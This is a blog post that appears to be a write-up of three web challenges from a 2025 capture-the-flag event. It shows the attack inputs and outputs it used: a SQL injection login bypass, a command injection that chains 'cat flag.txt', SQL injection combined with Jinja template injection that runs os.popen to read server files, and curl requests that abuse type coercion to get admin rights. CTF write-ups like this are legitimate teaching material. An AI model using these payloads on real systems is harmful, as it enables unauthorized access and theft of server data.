---
layout: post
title:  "Patriot 2025 Web"
date:   2025-11-24 16:54:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /patriot-ctf-2025-web/
---
* TOC
{:toc}

{% raw  %}

## Connection Tester

**Category**: Web

**Challenge author**: Sid Kumar

**Description**: Our company threw together an operations dashboard to show to our clients for a demo, but it accidentally got pushed to production. We had some junior developers work on it, so there's probably some rookie mistakes in the application itself. 
`Challenge link: http://18.212.136.134:9080/`

I go to the site and am greeted by a simple login page. I login with the username and password: `' OR '1'='1`

I login and land at `http://18.212.136.134:9080/dashboard`:

![Alt text](/images/web1.png)

Once I open the connectivity tool I see I can execute commands on the server:

![Alt text](/images/connected.png)

At first I couldnt directly execute commands because the server was appending `...` By adding the comment character (`#`) I could easily execute commands:
```
127.0.0.1; cat flag.txt #

#### Command Output

connecting to 127.0.0.1
Great! You got the flag:

PCTF{C0nn3cti0n_S3cured}
```

`PCTF{C0nn3cti0n_S3cured}`

___

## Trust Vault

**Category**: Web

**Challenge author**: IAmPradeep

**Description**: Leak the server-side flag stored on disk/environment by chaining the vulnerable SQL query with the legacy Jinja rendering. `Challenge link: http://18.212.136.134:5001/`

I go the website and try to login with some common credentials and basic authentication bypass. They dont work so I create an account and login. Once I am logged in I see this:

![Alt text](/images/web3.png)

When looking at `view-source:http://18.212.136.134:5001/bookmarks` I find this comment in the html:
```html
<!-- <p>Legacy console: <a href="/search">/search</a></p> -->
```

On `http://18.212.136.134:5001/search` I can send SSTI payloads through SQLi. I ran basic enumeration commands (`whoami`, `pwd`, `ls -la`, etc). I noticed inside `init.sh` that the flag is saved as: `flag-<16-random-characters>.txt`.
```sql
' UNION SELECT '{{ cycler.__init__.__globals__.__builtins__.__import__("os").popen("cat init.sh").read() }}'--
  
#!/bin/bash random_chars=$(openssl rand -hex 16) echo $FLAG > /flag-${random_chars}.txt unset FLAG exec python main.py
```

Payload to get flag:
```sql
' UNION SELECT '{{ cycler.__init__.__globals__.__builtins__.__import__("os").popen("cat /flag-*.txt 2>/dev/null || ls -la /flag-*.txt").read() }}'--
```

`PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY}`

___

## 🔐 SecureAuth™

**Category**: Web

**Challenge author**: vWing

**Description**: One of our interns just finished their Python coding bootcamp and made this fancy shcmancy demo web page. They say it's really secure, but I don't know... The flag can be wrapped in FLAG{...} and pctf{...} . Both will be accepted. 
`Challenge link: http://18.212.136.134:5200/`

I go to the site and there is a login page with guest credentials:

![Alt text](/images/SecureAuthLogin.png)

Logging in with the guest creds really isnt helpful.

On the about page I notice they talk about "type coercion protection". I decided to test that using `/api/authenticate`. 

![Alt text](/images/SecureAuthAbout.png)

I saw that when logging in with guest creds a "flag" is returned as null:
```shell
curl -X POST http://18.212.136.134:5200/api/authenticate -H "Content-Type: application/json" -d '{"username":"guest","password":"guest123","remember":false}'  

{"flag":null,"message":"Authentication successful","role":"guest","success":true,"user":"guest"}
```

I try username `admin` with empty an password and `remember` as the string `admin`:
```shell
curl -X POST http://18.212.136.134:5200/api/authenticate -H "Content-Type: application/json" -d '{"username":"admin","password":"","remember":"admin"}'  

{"flag":"FLAG{py7h0n_typ3_c03rc10n_byp4ss}","message":"Authentication successful","role":"admin","success":true,"user":"admin"}
```

`FLAG{py7h0n_typ3_c03rc10n_byp4ss}`

{% endraw %}